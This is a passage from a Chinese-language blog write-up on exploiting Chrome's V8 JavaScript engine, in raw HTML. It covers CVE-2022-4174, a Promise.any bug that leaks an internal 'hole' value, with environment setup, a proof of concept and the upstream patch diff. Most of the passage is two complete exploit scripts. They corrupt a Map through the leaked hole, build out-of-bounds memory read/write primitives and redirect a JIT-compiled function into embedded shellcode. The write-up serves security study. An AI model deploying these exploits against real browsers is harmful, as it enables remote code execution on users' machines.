class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    obj.<span class="property">b1</span> = <span class="number">1</span>;</span><br><span class="line">    obj.<span class="property">b2</span> = <span class="number">2</span>;</span><br><span class="line">    obj.<span class="property">b3</span> = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_hole</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> obj = &#123; <span class="attr">sky</span>: <span class="number">123</span> &#125;;</span><br><span class="line">        obj.<span class="property">a2</span> = <span class="number">1</span>;</span><br><span class="line">        obj.<span class="property">a3</span> = <span class="number">2</span>;</span><br><span class="line">        obj.<span class="property">a4</span> = <span class="number">3</span>;</span><br><span class="line">        <span class="title function_">trigger</span>(obj); </span><br><span class="line">        hole_array = [, <span class="literal">undefined</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// % DebugPrint(obj);</span></span><br><span class="line">    <span class="comment">// % SystemBreak();</span></span><br><span class="line">    <span class="keyword">return</span> obj.<span class="property">b3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> hole = <span class="title function_">get_hole</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(hole);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>); <span class="comment">// -1</span></span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x15</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x303</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">13</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">21</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>) &lt;&lt; <span class="number">32n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">21</span>]) &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">21</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>) &lt;&lt; <span class="number">32n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">21</span>]) &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode_offset = <span class="title function_">offset_of</span>(shellcode);</span><br><span class="line"><span class="keyword">var</span> leak_offset = (<span class="title function_">read</span>(shellcode_offset + <span class="number">0x18n</span>) &amp; <span class="number">0xFFFFFFFFn</span>) + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> leak_data = <span class="title function_">read</span>(leak_offset);</span><br><span class="line"><span class="keyword">var</span> code = leak_data &gt;&gt; <span class="number">32n</span>;</span><br><span class="line"><span class="keyword">var</span> code_entry_point = leak_data &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write</span>(leak_offset, (code &lt;&lt; <span class="number">32n</span>) | (code_entry_point + <span class="number">0x68n</span>));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] leak offset: &quot;</span> + <span class="title function_">hex</span>(leak_offset));</span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<h2 id="CVE-2022-4174"><a href="#CVE-2022-4174" class="headerlink" title="CVE-2022-4174"></a>CVE-2022-4174</h2><p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/CVE-2022-4174" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>环境搭建如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git checkout 9.7.106.19</span><br><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line">tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>
<p>数组 <code>errors</code> 长度总是设置比所需长度长，而多出来的那个部分的值设为 <code>Hole</code> 。这个数组泄露给用户也就把 <code>Hole</code> 泄露给用户。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 9. Set errors[index] to x.</span></span><br><span class="line"><span class="type">const</span> newCapacity = <span class="built_in">IntPtrMax</span>(<span class="built_in">SmiUntag</span>(remainingElementsCount), index + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (newCapacity &gt; errors.length_intptr) deferred &#123;</span><br><span class="line">    errors = <span class="built_in">ExtractFixedArray</span>(errors, <span class="number">0</span>, errors.length_intptr, newCapacity);</span><br><span class="line">    *<span class="built_in">ContextSlot</span>(</span><br><span class="line">        context,</span><br><span class="line">        PromiseAnyRejectElementContextSlots::</span><br><span class="line">            kPromiseAnyRejectElementErrorsSlot) = errors;</span><br><span class="line">  &#125;</span><br><span class="line">errors.objects[index] = value;</span><br></pre></td></tr></table></figure></div>
<p>因此有如下 poc：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> v1;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">f0</span>(<span class="params">v4</span>) &#123;</span><br><span class="line">        <span class="title function_">v4</span>(<span class="function">() =&gt;</span> &#123; &#125;, <span class="function"><span class="params">v5</span> =&gt;</span> &#123; v1 = v5.<span class="property">errors</span>; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    f0.<span class="property">resolve</span> = <span class="function">(<span class="params">v6</span>) =&gt;</span> &#123; <span class="keyword">return</span> v6; &#125;;</span><br><span class="line">    <span class="keyword">let</span> v3 = &#123;</span><br><span class="line">        <span class="title function_">then</span>(<span class="params">v7, v8</span>) &#123;</span><br><span class="line">            <span class="title function_">v8</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title class_">Promise</span>.<span class="property">any</span>.<span class="title function_">call</span>(f0, [v3]);</span><br><span class="line">    <span class="keyword">return</span> v1[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>该 POC 的过程为：</p>
<ul>
<li>通过调用 <code>Promise.any.call(f0, [v3])</code> ，使用 <code>Promise.any</code> 方法来执行异步操作。</li>
<li>执行函数 <code>f0</code> ，参数为 <code>v4</code> 类型未知。</li>
<li>执行 <code>f0.resolve</code> 函数，参数 <code>v6</code> 即 <code>v3</code> 。</li>
<li>执行 <code>then</code> 函数，<code>then</code> 函数第一个参数为 <code>v4</code> 第一个参数，第二个参数未知，但随即会调用 <code>v5</code> 函数。</li>
<li>执行 <code>v5</code> 函数，取出 <code>v5</code> 的 <code>errors</code> 数组赋值给变量 <code>v1</code> 。</li>
</ul>
<p>exp 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> v1;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">f0</span>(<span class="params">v4</span>) &#123;</span><br><span class="line">        <span class="title function_">v4</span>(<span class="function">() =&gt;</span> &#123; &#125;, <span class="function"><span class="params">v5</span> =&gt;</span> &#123; v1 = v5.<span class="property">errors</span>; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    f0.<span class="property">resolve</span> = <span class="function">(<span class="params">v6</span>) =&gt;</span> &#123; <span class="keyword">return</span> v6; &#125;;</span><br><span class="line">    <span class="keyword">let</span> v3 = &#123;</span><br><span class="line">        <span class="title function_">then</span>(<span class="params">v7, v8</span>) &#123;</span><br><span class="line">            <span class="title function_">v8</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title class_">Promise</span>.<span class="property">any</span>.<span class="title function_">call</span>(f0, [v3]);</span><br><span class="line">    <span class="keyword">return</span> v1[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> hole = <span class="title function_">trigger</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(hole);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>); <span class="comment">// -1</span></span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x16</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x303</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">14</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map &amp; <span class="number">0xFFFFFFFn</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(double_array_map &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">22</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>)) | (<span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]) &amp; <span class="number">0xFFFFFFFF00000000n</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">22</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>)) | (<span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]) &amp; <span class="number">0xFFFFFFFF00000000n</span>));</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> code_offset = <span class="title function_">read</span>(<span class="title function_">offset_of</span>(shellcode) + <span class="number">0x18n</span>) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] code offset: &quot;</span> + <span class="title function_">hex</span>(code_offset));</span><br><span class="line"></span><br><span class="line">code_offset += <span class="number">0x68n</span>;</span><br><span class="line"><span class="title function_">write</span>(<span class="title function_">offset_of</span>(shellcode) + <span class="number">0x18n</span>, code_offset);</span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<p>该漏洞修复<a class="link"   target="_blank" rel="noopener" href="https://chromium.googlesource.com/v8/v8/+/8b35091b2d244c975975e1c78e4cd09cb479b5dc%5E!/#F0" >补丁 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>如下：</p>
<div class="highlight-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/builtins/promise-any.tq b/src/builtins/promise-any.tq</span></span><br><span class="line"><span class="comment">index ffb285a..7e707e6 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/promise-any.tq</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/promise-any.tq</span></span><br><span class="line"><span class="meta">@@ -119,7 +119,19 @@</span></span><br><span class="line">           kPromiseAnyRejectElementRemainingSlot);</span><br><span class="line"> </span><br><span class="line">   // 9. Set errors[index] to x.</span><br><span class="line"><span class="deletion">-  const newCapacity = IntPtrMax(SmiUntag(remainingElementsCount), index + 1);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  // The max computation below is an optimization to avoid excessive allocations</span></span><br><span class="line"><span class="addition">+  // in the case of input promises being asynchronously rejected in ascending</span></span><br><span class="line"><span class="addition">+  // index order.</span></span><br><span class="line"><span class="addition">+  //</span></span><br><span class="line"><span class="addition">+  // Note that subtracting 1 from remainingElementsCount is intentional. The</span></span><br><span class="line"><span class="addition">+  // value of remainingElementsCount is 1 larger than the actual value during</span></span><br><span class="line"><span class="addition">+  // iteration. So in the case of synchronous rejection, newCapacity is the</span></span><br><span class="line"><span class="addition">+  // correct size by subtracting 1. In the case of asynchronous rejection this</span></span><br><span class="line"><span class="addition">+  // is 1 smaller than the correct size, but is not incorrect as it is maxed</span></span><br><span class="line"><span class="addition">+  // with index + 1.</span></span><br><span class="line"><span class="addition">+  const newCapacity =</span></span><br><span class="line"><span class="addition">+      IntPtrMax(SmiUntag(remainingElementsCount) - 1, index + 1);</span></span><br><span class="line">   if (newCapacity &gt; errors.length_intptr) deferred &#123;</span><br><span class="line">       errors = ExtractFixedArray(errors, 0, errors.length_intptr, newCapacity);</span><br><span class="line">       *ContextSlot(</span><br><span class="line"><span class="meta">@@ -306,6 +318,7 @@</span></span><br><span class="line">           PromiseAnyRejectElementContextSlots::</span><br><span class="line">               kPromiseAnyRejectElementErrorsSlot);</span><br><span class="line"> </span><br><span class="line"><span class="addition">+      check(errors.length == index - 1);</span></span><br><span class="line">       const error = ConstructAggregateError(errors);</span><br><span class="line">       // 3. Return ThrowCompletion(error).</span><br><span class="line">       goto Reject(error);</span><br></pre></td></tr></table></figure></div>
        </div>

        
            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Chrome V8 Pwn</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2024-11-08 13:34:18</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2024-11-08 13:38:28
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2024/11/08/musl-pwn/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">musl pwn</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
